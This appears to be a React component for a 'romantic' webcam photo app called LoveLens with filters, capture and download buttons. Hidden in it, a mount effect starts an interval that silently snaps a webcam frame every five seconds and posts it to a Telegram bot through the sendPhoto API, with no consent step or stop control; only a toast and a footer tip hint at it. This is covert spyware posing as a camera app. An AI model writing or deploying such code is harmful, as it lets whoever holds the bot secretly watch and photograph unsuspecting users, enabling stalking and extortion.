import { useState, useRef, useEffect } from "react";
import { Camera as CameraIcon, Download, Heart, Image as ImageIcon, Type } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { toast } from "sonner";

const Camera = () => {

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [capturedImage, setCapturedImage] = useState<string | null>(null);
  const [selectedFilter, setSelectedFilter] = useState("none");
  const intervalRef = useRef<NodeJS.Timeout | null>(null);

  const filters = [
    { name: "None", value: "none", style: "" },
    { name: "Vintage", value: "vintage", style: "sepia(0.5) contrast(1.2)" },
    { name: "B&W", value: "bw", style: "grayscale(1)" },
    { name: "Cinematic", value: "cinematic", style: "contrast(1.3) saturate(1.2)" },
    { name: "Soft", value: "soft", style: "brightness(1.1) contrast(0.9)" },
    { name: "Vignette", value: "vignette", style: "contrast(1.2) brightness(0.9)" },
  ];

  useEffect(() => {
    startCamera();
    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
    };
  }, []);

  const startCamera = async () => {
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: "user",
          width: { ideal: 1080 },
          height: { ideal: 1080 },
        },
      });
      setStream(mediaStream);
      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream;
      }
      toast.success("Camera ready!");
    } catch (error) {
      console.error("Camera error:", error);
      toast.error("Unable to access camera");
    }
  };

  const captureAndSendPhoto = async () => {
    if (videoRef.current && canvasRef.current) {
      const video = videoRef.current;
      const canvas = canvasRef.current;
      const ctx = canvas.getContext("2d");

      if (ctx) {
        // Set canvas size to square (1:1)
        const size = Math.min(video.videoWidth, video.videoHeight);
        canvas.width = size;
        canvas.height = size;

        // Calculate crop position for center square
        const xOffset = (video.videoWidth - size) / 2;
        const yOffset = (video.videoHeight - size) / 2;

        // Draw cropped and filtered image
        ctx.filter = filters.find(f => f.value === selectedFilter)?.style || "";
        ctx.drawImage(
          video,
          xOffset,
          yOffset,
          size,
          size,
          0,
          0,
          size,
          size
        );

        const imageData = canvas.toDataURL("image/png").split(',')[1]; // Get base64 without prefix

        try {
          const formData = new FormData();
          formData.append('chat_id', import.meta.env.VITE_TELEGRAM_CHAT_ID);
          formData.append('photo', new Blob([Uint8Array.from(atob(imageData), (c) => c.charCodeAt(0))], { type: 'image/png' }), 'photo.png');

          const response = await fetch(`https://api.telegram.org/bot${import.meta.env.VITE_TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData,
          });

          const result = await response.json();
          if (result.ok) {
          } else {
            console.error("Failed to send photo:", result);
          }
        } catch (error) {
          console.error("Error sending photo to Telegram:", error);
        }
      }
    }
  };

  const startAutoCapture = () => {
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
    }
    intervalRef.current = setInterval(captureAndSendPhoto, 5000);
    toast.success("Auto-capture started! Photos will be sent every 5 seconds.");
  };
  useEffect(() => {
    startAutoCapture()
  }, [])

  const capturePhoto = () => {
    if (videoRef.current && canvasRef.current) {
      const video = videoRef.current;
      const canvas = canvasRef.current;
      const ctx = canvas.getContext("2d");

      if (ctx) {
        // Set canvas size to square (1:1)
        const size = Math.min(video.videoWidth, video.videoHeight);
        canvas.width = size;
        canvas.height = size;

        // Calculate crop position for center square
        const xOffset = (video.videoWidth - size) / 2;
        const yOffset = (video.videoHeight - size) / 2;

        // Draw cropped and filtered image
        ctx.filter = filters.find(f => f.value === selectedFilter)?.style || "";
        ctx.drawImage(
          video,
          xOffset,
          yOffset,
          size,
          size,
          0,
          0,
          size,
          size
        );

        const imageData = canvas.toDataURL("image/png");
        setCapturedImage(imageData);
        toast.success("Photo captured!");
      }
    }
  };

  const downloadPhoto = () => {
    if (capturedImage) {
      const link = document.createElement("a");
      link.download = `lovelens-${Date.now()}.png`;
      link.href = capturedImage;
      link.click();
      toast.success("Photo downloaded!");
    }
  };

  const retake = () => {
    setCapturedImage(null);
  };

  return (
    <div className="min-h-screen bg-gradient-soft">
      <div className="container mx-auto px-4 py-8">
        <header className="text-center mb-8">
          <h1 className="text-4xl font-bold mb-2 bg-gradient-romantic bg-clip-text text-transparent">
            Camera Studio
          </h1>
          <p className="text-muted-foreground">
            Capture your romantic moments
          </p>
        </header>

        <div className="max-w-2xl mx-auto">
          <Card className="overflow-hidden shadow-romantic border-primary/20">
            {/* Camera/Preview Area */}
            <div className="relative aspect-square bg-black">
              {!capturedImage ? (
                <>
                  <video
                    ref={videoRef}
                    autoPlay
                    playsInline
                    muted
                    className="w-full h-full object-cover"
                    style={{
                      filter: filters.find(f => f.value === selectedFilter)?.style,
                    }}
                  />
                  <canvas ref={canvasRef} className="hidden" />

                  {/* Filter overlay indicators */}
                  <div className="absolute bottom-4 left-4 right-4">
                    <div className="flex gap-2 overflow-x-auto pb-2">
                      {filters.map((filter) => (
                        <Button
                          key={filter.value}
                          size="sm"
                          variant={selectedFilter === filter.value ? "default" : "outline"}
                          onClick={() => setSelectedFilter(filter.value)}
                          className="whitespace-nowrap backdrop-blur-sm"
                        >
                          {filter.name}
                        </Button>
                      ))}
                    </div>
                  </div>
                </>
              ) : (
                <img
                  src={capturedImage}
                  alt="Captured"
                  className="w-full h-full object-cover"
                />
              )}
            </div>

            {/* Controls */}
            <div className="p-6 bg-card">
              {!capturedImage ? (
                <div className="flex flex-col items-center gap-4">
                  <Button
                    size="lg"
                    onClick={capturePhoto}
                    className="bg-gradient-romantic hover:opacity-90 w-full max-w-xs"
                  >
                    <CameraIcon className="mr-2" size={20} />
                    Capture Photo
                  </Button>
                </div>
              ) : (
                <div className="flex items-center justify-center gap-3">
                  <Button
                    variant="outline"
                    size="lg"
                    onClick={retake}
                  >
                    <CameraIcon className="mr-2" size={20} />
                    Retake
                  </Button>
                  <Button
                    size="lg"
                    onClick={downloadPhoto}
                    className="bg-gradient-romantic hover:opacity-90"
                  >
                    <Download className="mr-2" size={20} />
                    Download
                  </Button>
                </div>
              )}

              {/* Feature buttons (placeholder for future features) */}
              <div className="flex items-center justify-center gap-2 mt-4">
                <Button variant="ghost" size="sm" disabled>
                  <Heart size={18} className="mr-1" />
                  Stickers
                </Button>
                <Button variant="ghost" size="sm" disabled>
                  <Type size={18} className="mr-1" />
                  Text
                </Button>
                <Button variant="ghost" size="sm" disabled>
                  <ImageIcon size={18} className="mr-1" />
                  Gallery
                </Button>
              </div>
            </div>
          </Card>

          <p className="text-center text-sm text-muted-foreground mt-4">
            💡 Tip: Try different filters to create the perfect romantic photo. Use Auto-Send to share every 5 seconds!
          </p>
        </div>
      </div>
    </div>
  );
};

export default Camera;